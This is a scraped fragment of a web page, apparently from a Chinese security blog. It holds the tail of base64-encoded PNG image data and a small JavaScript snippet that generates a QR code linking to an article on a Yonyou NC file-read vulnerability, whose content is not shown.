OKxcvkXzXpZSs9eJ/JgWMg1Pa7wR63xMOZBvLg7u8XnkAbCLBNTpOXrfYEvQYcg3FVE049ZYmF4DrxMnCs3GjKy8Aa+DqOPRVD30dcDPocOE7+CmrPX7E2kCvNb83fP4F7IH//jL+0Qvtb1pWqXD3w1U2c2sTCcEFwDeyYXFB11cILwXU1X3350lUTV+0sFx14HaDJkwsmkXiF0ZwhsL1MVM19Q+ppvIHfPhhmytBPDRzDjkfa+vtEE26MxYcD9xZXDczD/qEPdg6o8vZ/VB37AtuTCDt2hY8AnHu47Xvs0xKfDrgGdvxMtfUSr3DsD9z/KenHm31N/2RlasG633DgJyJxEMwDrSy5Rpw4QHuyYL8V6pEy+bLEFcH14aSTjbE4sBaMZxrpZdFAXxNeCM5JLwPHgNKbAd3vuZGfP6aBfPI3vOgE2kCgnxo4Xu1Lk5etcuGgrwfHqovBzCUnBOeBtG1PVgigcaqRJXcFpa+2qgGvkVzVj340wZofucQV20AqefuvO4H2OaROUv7ZlqB/YqCPay0c57SODKwBY62PD8e5UQO9VmvIojtDcC0wyYDtNiYBjmHHsxxYF01Qe4vdNySn8iZ4D+R0EL+fbB8Mx6VzhSpGEy5xMPwZgq8t7Djqwbn0XeFYU+OV/iq36lM5+ate4ldWtclXTj749wXuD4Yfb/bVXtRhnxJc8/O7ZPIw10UTjFYY7k8Q9jXHPrDngC6t9WUhge0FG3ZUXgbmRm3iitBrVzmwRr1lVXO/htTTeAO/DUSTumrjvsETr3x6QZ8Dx7D/aSR14FziiulXOfnhhYpXppwM3B9YyTZOuhiw3ZrEm+DJjzNtckFw/9qyDaSSt/+6E5gGAp4azPjT24R+jfTPE1QRrI0GHMOM0QTBmrN+oxYINWH61ASw3SbocaWpnPz0E04DkeC2153APZDXnf1y5R8ZiK6abLnCBVK11VIC+/Wv+epHW7Hmqw9zv1onv+rji79qZzXJpVdi2Pf1IwPJAjf++Qn8yEDAE67bAXPjU5C4Yq078sH9kgfHtU/8UZO4IrgejKkFx0CVdz6wvYB35IUAXAfGVcmPDGTV+Oa+dwLTQPKkrPBoiTMt+GmIZtUDrAHjSnOFg/P67GGFcF6r9eG5RjrZag3xsuTA/RILp4Go4LbXnUAbCHha8ByvbFfTlo1amPsfaSqvXjJwfXLgGAjVUHpZI4oDbK8DYCypQ1e9juyoCNwf5j8VpQZ2TRtIkje+9gTugbz2/KfV/wsAAP//sGydpQAAAAZJREFUAwC7PlqtutcA5AAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-uapws-loadDoc-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 